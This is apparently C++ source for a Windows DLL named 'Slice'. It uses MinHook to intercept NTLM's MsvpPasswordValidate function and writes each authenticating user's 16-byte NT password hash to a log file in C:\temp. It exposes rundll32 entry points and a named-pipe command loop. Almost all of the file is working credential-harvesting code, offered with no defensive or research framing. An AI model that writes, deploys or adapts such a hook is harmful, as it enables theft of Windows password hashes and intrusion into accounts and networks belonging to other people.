#include <stdio.h>
#include <string>
#include <iostream>
//#include <mschapp.h>

#include "Slice.h"
#include "MinHook.h"
#include "shared.h"
#include "utils/debug.h"

FILE* logfile;
void write_to_log(const char* format, ...)
{
	fopen_s(&logfile, "C:\\temp\\logfile.txt", "a+");
	va_list args = NULL;
	va_start(args, format);

	vfprintf(logfile, format, args);

	va_end(args);
	fclose(logfile);
}

// global function pointer
void* g_MsvpPasswordValidate = NULL;

static BOOLEAN MsvpPasswordValidate(BOOLEAN UasCompatibilityRequired,
	NETLOGON_LOGON_INFO_CLASS LogonLevel,
	PVOID LogonInformation,
	PVOID Passwords, //PUSER_INTERNAL1_INFORMATION Passwords,
	PULONG UserFlags,
	PUSER_SESSION_KEY UserSessionKey,
	PVOID LmSessionKey
)
{
	//printf("[?] Called MsvpPasswordValidate...\n");
	write_to_log("[?] Called MsvpPasswordValidate...\n");
	write_to_log("\tUasCompatibilityRequired : 0x%x\n", UasCompatibilityRequired);
	write_to_log("\tLogonLevel               : 0x%x\n", LogonLevel);
	write_to_log("\tLoginInformation         : TODO\n");
	write_to_log("\tPasswords\n");
	unsigned char* temp = (unsigned char*)Passwords;
	write_to_log("\t\tNTHash              : %.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x\n",
		temp[0], temp[1], temp[2], temp[3], temp[4], temp[5], temp[6],
		temp[7], temp[8], temp[9], temp[10], temp[11], temp[12], temp[13],
		temp[14], temp[15]);

	return ((FnMsvpPasswordValidate)g_MsvpPasswordValidate)(
		UasCompatibilityRequired,
		LogonLevel,
		LogonInformation,
		Passwords,
		UserFlags,
		UserSessionKey,
		LmSessionKey
		);
};

static void testdetour(int n) {
	DbgFprintf(outlogfile, PRINT_INFO1, "Inside hooked function\n");
	((FnTestF)(n));
}

Slice::Slice()
{
	pMsvpPasswordValidate = NULL;
}

void Slice::start()
{
	ioPipes.init(input_pipe_name, output_pipe_name, input_event_name, output_event_name);
	ioPipes.start("", true, true);

	MH_Initialize();

	hookfunc();
	//testhook();
}

void Slice::stop()
{
	unhookfunc();

	MH_Uninitialize();

	ioPipes.stop();
}

std::string Slice::readinput()
{
	std::vector<uint8_t> input = ioPipes.readFromInput();
	if (input.size() > 0)
		return std::string(input.begin(), input.begin() + input.size());
	else
		return std::string();
}

void Slice::hookfunc()
{
	pMsvpPasswordValidate = GetProcAddress(GetModuleHandleA("NtlmShared"), "MsvpPasswordValidate");
	if (!pMsvpPasswordValidate) {
		DbgFprintf(outlogfile, PRINT_ERROR, "GetProcAddress error 0x%x, %d\n", GetLastError(), GetLastError());
		return;
	}
	DbgFprintf(outlogfile, PRINT_INFO1, "MsvpPasswordValidate  - 0x%llx\n", pMsvpPasswordValidate);

	MH_STATUS status = MH_CreateHook(pMsvpPasswordValidate, MsvpPasswordValidate, &g_MsvpPasswordValidate);
	if (status != MH_OK) {
		DbgFprintf(outlogfile, PRINT_ERROR, "MH_CreateHook error %d\n", status);
		return;
	}

	status = MH_EnableHook(MH_ALL_HOOKS);
	if (status != MH_OK) {
		DbgFprintf(outlogfile, PRINT_ERROR, "MH_EnableHook error %d\n", status);
		return;
	}
}

void Slice::testhook()
{
	pMsvpPasswordValidate = (void*)0x00007FF6260F4071;
	DbgFprintf(outlogfile, PRINT_INFO1, "MsvpPasswordValidate  - 0x%llx\n", pMsvpPasswordValidate);

	MH_STATUS status = MH_CreateHook(pMsvpPasswordValidate, MsvpPasswordValidate, &g_MsvpPasswordValidate);
	if (status != MH_OK) {
		DbgFprintf(outlogfile, PRINT_ERROR, "MH_CreateHook error %d\n", status);
		return;
	}

	status = MH_EnableHook(MH_ALL_HOOKS);
	if (status != MH_OK) {
		DbgFprintf(outlogfile, PRINT_ERROR, "MH_EnableHook error %d\n", status);
		return;
	}
}

void Slice::unhookfunc()
{
	MH_STATUS status = MH_OK;

	if (g_MsvpPasswordValidate) {
		status = MH_DisableHook(MH_ALL_HOOKS);
		if (status != MH_OK) {
			DbgFprintf(outlogfile, PRINT_ERROR, "MH_DisableHook error %d\n", status);
			return;
		}
	}
}

void entry()
{
	fopen_s(&outlogfile, "c:\\temp\\outlog.txt", "w+");
	DbgFprintf(outlogfile, PRINT_INFO1, "Slice executing!!!!!\n");

	Slice theSlice;
	theSlice.start();

	DbgFprintf(outlogfile, PRINT_INFO1, "here\n");
	while (true) {
		std::string inputcmd = theSlice.readinput();
		if (inputcmd.size() > 0) {
			if (inputcmd.compare("exit") == 0) {
				DbgFprintf(outlogfile, PRINT_INFO1, "Slice exitting!!!!!\n");
				break;
			}
			else {
				DbgFprintf(outlogfile, PRINT_ERROR, "unknown command: %s\n", inputcmd.c_str());
			}
		}
	}

	theSlice.stop();

	DbgFprintf(outlogfile, PRINT_INFO1, "and here\n");

	fclose(outlogfile);
}

extern "C" {
	//entry point to be called with rundll32
	__declspec(dllexport) void rundllentry(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
	{
		entry();
	}


	//dll entry point
	__declspec(dllexport) void dllentry()
	{
		entry();
	}
}

//exe entry point
int main(int argc, char** argv)
{
	entry();

#ifdef _DEBUG
	_CrtDumpMemoryLeaks();
#endif

	return 0;
}

//dll entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}